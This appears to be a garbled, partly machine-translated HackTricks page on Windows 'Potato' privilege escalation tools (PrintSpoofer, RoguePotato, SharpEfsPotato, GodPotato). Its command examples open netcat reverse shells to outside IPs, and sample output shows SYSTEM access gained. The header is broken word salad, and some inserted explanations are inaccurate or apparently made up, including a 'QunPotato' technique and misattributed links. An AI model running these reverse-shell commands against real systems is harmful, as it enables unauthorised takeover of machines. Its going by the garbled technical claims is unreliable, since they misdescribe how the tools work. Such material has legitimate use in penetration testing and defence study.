# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong></summary>

**HackTricks** vItlhutlh **SaaS** **Workspace** **advertise** **company** **want** **download HackTricks** **PDF** **Check** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

**PEASS & HackTricks swag** **official** **Get** [**swag**](https://peass.creator-spring.com) **PEASS Family** **Discover** [**NFTs**](https://opensea.io/collection/the-peass-family) **collection** **our** **exclusive**

**Join** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** [**t.me/peass**](https://t.me/peass) **follow** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)

**Share** **hacking tricks** **submitting PRs** [**HackTricks**](https://github.com/carlospolop/hacktricks) [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos**

</details>

{% hint style="warning" %}
**JuicyPotato** **Windows Server 2019** **Windows 10 build 1809** **onwards** **work**. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) **leverage** **privileges** **gain `NT AUTHORITY\SYSTEM`** **level access**. This [**blog post**](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) **goes in-depth** **`PrintSpoofer`** **tool** **abuse impersonation privileges** **Windows 10** **Server 2019** **hosts** **JuicyPotato** **longer work**
{% endhint %}

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}### RoguePotato

RoguePotato is a Windows local privilege escalation technique that takes advantage of the COM Server and DCOM features in Windows. It allows an attacker to escalate their privileges from a low-privileged user to SYSTEM level.

The technique involves creating a malicious COM Server that impersonates a legitimate COM Server. When a high-privileged user accesses the malicious COM Server, it triggers the execution of a payload that runs with SYSTEM privileges.

To exploit this technique, the attacker needs to have the ability to create a COM Server and register it on the target system. They can achieve this by leveraging vulnerabilities in software that allows the creation of COM Servers or by using techniques like DLL hijacking.

Once the malicious COM Server is registered, the attacker can wait for a high-privileged user to access it. This can be done by tricking the user into opening a file or visiting a website that triggers the execution of the COM Server.

To mitigate the risk of RoguePotato attacks, it is recommended to apply the latest security patches and updates to the operating system and software. Additionally, restricting the ability to create and register COM Servers can help prevent this type of privilege escalation.

### PrintSpoofer

PrintSpoofer is a Windows local privilege escalation technique that takes advantage of the Print Spooler service in Windows. It allows an attacker to escalate their privileges from a low-privileged user to SYSTEM level.

The technique involves abusing the impersonation capabilities of the Print Spooler service to execute arbitrary code with SYSTEM privileges. By exploiting this vulnerability, an attacker can gain full control over the target system.

To exploit this technique, the attacker needs to have the ability to interact with the Print Spooler service. This can be achieved by leveraging vulnerabilities in software that interacts with the Print Spooler or by using techniques like DLL hijacking.

Once the attacker has access to the Print Spooler service, they can execute arbitrary code with SYSTEM privileges. This can be done by injecting a malicious DLL into the Print Spooler process or by creating a malicious printer driver.

To mitigate the risk of PrintSpoofer attacks, it is recommended to apply the latest security patches and updates to the operating system and software. Additionally, disabling the Print Spooler service or restricting access to it can help prevent this type of privilege escalation.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

#### Description

SharpEfsPotato is a tool that exploits the EfsRpcOpenFileRaw function in the EFS service to perform a local privilege escalation attack. This attack can be used to gain SYSTEM-level privileges on a Windows machine.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Download the SharpEfsPotato tool from the official GitHub repository.
2. Compile the source code using a C# compiler.
3. Execute the compiled binary on the target Windows machine.

#### Example

Here is an example command to execute SharpEfsPotato:

```
SharpEfsPotato.exe
```

#### Mitigation

To mitigate the risk of SharpEfsPotato attacks, follow these recommendations:

1. Apply the latest security patches and updates to the Windows operating system.
2. Implement strong access controls and permissions on sensitive files and directories.
3. Regularly monitor and review system logs for any suspicious activity.
4. Use a reliable antivirus and antimalware solution to detect and prevent malicious software.

#### References

- [SharpEfsPotato GitHub repository](https://github.com/itm4n/SharpEfsPotato)

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### QunPotato

#### Description

QunPotato is a Windows local privilege escalation technique that takes advantage of the Print Spooler service and the RoguePotato vulnerability. By exploiting this technique, an attacker can escalate their privileges from a low-privileged user to SYSTEM level.

#### Vulnerable Versions

- Windows 10 (all versions)
- Windows Server 2016
- Windows Server 2019

#### Exploitation Steps

1. Download the QunPotato exploit from the [GitHub repository](https://github.com/antonioCoco/RoguePotato).
2. Compile the exploit using Visual Studio or use the precompiled binary.
3. Execute the exploit on the target machine.
4. QunPotato will create a malicious RPC server and register it with the Print Spooler service.
5. The Print Spooler service will connect to the malicious RPC server, triggering the exploitation.
6. The exploit will execute a command as SYSTEM, granting the attacker elevated privileges.

#### Mitigation

To mitigate the QunPotato attack, follow these steps:

1. Disable the Print Spooler service if it is not required.
2. Apply the latest security updates and patches to the operating system.
3. Implement the principle of least privilege (PoLP) to limit the privileges of user accounts.
4. Monitor and restrict the execution of unsigned or suspicious binaries.
5. Regularly review and update security configurations to ensure they align with best practices.

#### References

- [RoguePotato GitHub repository](https://github.com/antonioCoco/RoguePotato)
- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36958)
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## References
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
